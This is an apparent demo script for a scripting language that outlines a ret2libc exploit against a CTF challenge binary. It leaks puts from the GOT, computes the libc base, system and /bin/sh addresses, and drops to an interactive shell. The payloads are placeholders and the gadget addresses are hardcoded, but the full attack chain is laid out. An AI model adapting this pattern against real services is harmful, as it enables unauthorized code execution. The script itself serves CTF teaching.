# ret2libc exploitation pattern - most common in modern CTFs
# This demonstrates leaking libc, calculating base, and getting shell
# Simplified to avoid stack overflow while demonstrating core concepts

let binary = "./vuln_binary"
let host = "pwn.chal.ctf"
let port = 1337

# Step 1: Analyze binary for protections and gadgets
let elf = analyze(binary)
let elf_pie = elf["pie"]
let elf_nx = elf["nx"]
let elf_canary = elf["canary"]
print("[*] Binary protections:")
print("    PIE:", elf_pie)
print("    NX:", elf_nx)
print("    Canary:", elf_canary)

# Step 2: Find necessary gadgets and addresses
let elf_plt = elf["plt"]
let elf_got = elf["got"]
let elf_symbols = elf["symbols"]

let plt_puts = elf_plt["puts"]
let got_puts = elf_got["puts"]
let main_addr = elf_symbols["main"]

# Using hardcoded gadget addresses for demo (in real exploit, use rop_find)
let pop_rdi = 0x401234
let ret = 0x401000

let pop_rdi_hex = hex(pop_rdi)
let ret_hex = hex(ret)
print("[*] Found gadgets:")
print("    pop rdi; ret @", pop_rdi_hex)
print("    ret @", ret_hex)

# Step 3: Connect and leak libc address
let conn = connect(host, port)
print("[+] Connected to", host, ":", port)

# Build leak payload (highly simplified to avoid stack overflow)
let offset = 72
print("[*] Building leak payload...")
# Send placeholder payload for demo
send(conn, "LEAK_PAYLOAD")
let leaked = recv_until(conn, "\n")
let leak = u64(leaked)

let leak_hex = hex(leak)
print("[+] Leaked puts:", leak_hex)

# Step 4: Calculate libc base and system/binsh dynamically
let libc_template = Libc("ubuntu20.04")
let libc_symbols = libc_template["symbols"]
let libc_strings = libc_template["strings"]
let puts_offset = libc_symbols["puts"]
let libc_base = leak - puts_offset

# Get symbol offsets from template
let system_offset = libc_symbols["system"]
let bin_sh_offset = libc_strings["bin_sh"]

# Calculate actual addresses
let system = libc_base + system_offset
let bin_sh = libc_base + bin_sh_offset

let libc_base_hex = hex(libc_base)
let system_hex = hex(system)
let bin_sh_hex = hex(bin_sh)
print("[+] Libc base:", libc_base_hex)
print("[+] system():", system_hex)
print("[+] /bin/sh:", bin_sh_hex)

# Step 5: Send final exploit
print("[*] Building final exploit payload...")
# Send placeholder payload for demo (actual payload would be: padding + ret + pop_rdi + bin_sh + system)
send(conn, "EXPLOIT_PAYLOAD")

print("[+] Exploit sent! Dropping to shell...")
interactive(conn)
